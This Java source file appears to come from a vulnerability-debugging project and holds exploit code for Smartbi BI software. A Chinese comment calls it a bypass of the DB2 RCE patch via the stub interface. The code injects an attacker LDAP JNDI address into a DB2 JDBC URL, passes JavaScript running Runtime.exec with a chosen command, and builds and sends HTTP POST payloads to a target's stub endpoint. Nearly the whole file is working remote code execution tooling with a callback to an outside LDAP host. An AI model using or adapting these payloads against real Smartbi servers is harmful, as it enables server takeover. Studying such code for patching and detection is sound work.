package cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;
import smartbi.oltp.IDataSource;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import smartbi.freequery.repository.DataSource;
import smartbi.util.DBType;

/**
 * 利用stub接口绕过db2RCE漏洞补丁的漏洞
 */
public class PATCH_20230228 {

    public static void DataSourceService_testConnectionListExp(String jndiAddr) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {

        Class<?> clz = Class.forName("smartbi.freequery.client.datasource.DataSourceService");
        Constructor<?> constructor = clz.getDeclaredConstructor();
        constructor.setAccessible(true);

        Method testConnectionList = clz.getDeclaredMethod("testConnectionList", List.class);

        List<IDataSource> list = new ArrayList<>();
        DataSource dataSource = new DataSource();
        dataSource.setPassword("");
        dataSource.setMaxConnection(100);
        dataSource.setUser("");
        dataSource.setDriverType(new DBType("DB2"));
        dataSource.setValidationQuery("SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1");
        dataSource.setUrl("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiAddr + ";");
        dataSource.setName("com.pacemrc.vuldebug.smartbi.test");
        dataSource.setDriver("com.ibm.db2.jcc.DB2Driver");
        dataSource.setId("");
        dataSource.setDesc("");
        dataSource.setAlias("");
        dataSource.setDbCharset("");
        dataSource.setIdentifierQuoteString("");
        dataSource.setTransactionIsolation(-1);
        dataSource.setValidationQueryMethod(0);
        dataSource.setDbToCharset("");
        dataSource.setAuthenticationType("STATIC");
        dataSource.setDriverCatalog(null);
        dataSource.setExtendProp("{}");
        list.add(dataSource);

        Object instance = constructor.newInstance();
        testConnectionList.invoke(instance, list);

    }

    public static void DataSourceService_getJavaQueryDataParamsAndFieldsExp(String cmd) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {

        Class<?> clz = Class.forName("smartbi.freequery.client.datasource.DataSourceService");
        Constructor<?> constructor = clz.getDeclaredConstructor();
        constructor.setAccessible(true);

        Method getJavaQueryDataParamsAndFields = clz.getDeclaredMethod("getJavaQueryDataParamsAndFields", String.class, Map.class, String.class);

        String className = "smartbi.JavaScriptJavaQuery";
        HashMap<String, String> configs = new HashMap<>();
        configs.put("javaScript","importClass(java.lang.Runtime);var runtime = Runtime.getRuntime();runtime.exec('"+ cmd +"');");

        String dsId = "AP_WARNING_STYLE_SETTING";

        Object instance = constructor.newInstance();
        getJavaQueryDataParamsAndFields.invoke(instance, className,configs,dsId);
    }

    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, IOException {


        String cmd = "calc";
//        String jndiAddr = "ldap://192.168.26.160:1389/2ykmh5";
        DataSourceService_getJavaQueryDataParamsAndFieldsExp(cmd);
//        DataSourceService_testConnectionListExp(jndiAddr);


        String url = "http://10.58.120.201:18080/smartbi/any.stub";//any可换为任意字符
        String jndiUrl = "ldap://10.58.120.201:1389/ayv6fa";
        String body1 = "className=DataSourceService&methodName=testConnection&params=[{\"password\":\"\",\"maxConnection\":100,\"user\":\"\",\"driverType\":\"MYSQL\",\"validationQuery\":\"SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1\",\"url\":\"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiUrl + "\",\"name\":\"test\",\"driver\":\"com.ibm.db2.jcc.DB2Driver\",\"id\":\"\",\"desc\":\"\",\"alias\":\"\",\"dbCharset\":\"\",\"identifierQuoteString\":\"\",\"transactionIsolation\":-1,\"validationQueryMethod\":0,\"dbToCharset\":\"\",\"authenticationType\":\"STATIC\",\"driverCatalog\":null,\"extendProp\":\"{}\"}]";
        String body2 = "className=DataSourceService&methodName=testConnectionList&params=[[{\"password\":\"\",\"maxConnection\":100,\"user\":\"\",\"driverType\":\"MYSQL\",\"validationQuery\":\"SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1\",\"url\":\"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiUrl + "\",\"name\":\"test\",\"driver\":\"com.ibm.db2.jcc.DB2Driver\",\"id\":\"\",\"desc\":\"\",\"alias\":\"\",\"dbCharset\":\"\",\"identifierQuoteString\":\"\",\"transactionIsolation\":-1,\"validationQueryMethod\":0,\"dbToCharset\":\"\",\"authenticationType\":\"STATIC\",\"driverCatalog\":null,\"extendProp\":\"{}\"}]]";
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type","application/x-www-form-urlencoded");
        httpRequest.sendStringPost(httpPost,body1);

    }
}
